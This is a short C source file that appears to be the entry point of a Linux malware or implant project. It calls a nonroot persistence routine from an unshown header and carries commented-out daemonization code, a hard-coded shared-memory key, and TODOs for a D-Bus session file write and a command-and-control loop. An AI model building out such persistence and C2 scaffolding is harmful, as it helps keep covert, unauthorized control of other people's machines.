// stdlib
#include <unistd.h>
#include <string.h>
#include <stdbool.h>
#include <stdio.h>

// custom functions
#include "utils.h"
#include "persistence.h"

int main(int argc, char *argv[]) {

    //pid_t id = getuid();
    //int pid = getpid();

    //char *fpath; // filepath

    // TODO: session_dbus_file_write

    // Creating shared mem
    //int shm_id = shmget(0x64b2e2, 8, 0x1b6);

    bool result = nonroot_persistence();

    if (result == false) {
        printf("Failed to write data!\n");
        return 1;
    }


    /*
    // if non root do ....
    if (id == 0) {
        // run in the background
        daemon(0, 0);
        // TODO - spawn thread
    }

    while(1) {
        sleep(30);
    }

    // TODO: home dir creation?
    // TODO: main_c2_loop

     */
    return 0;
}
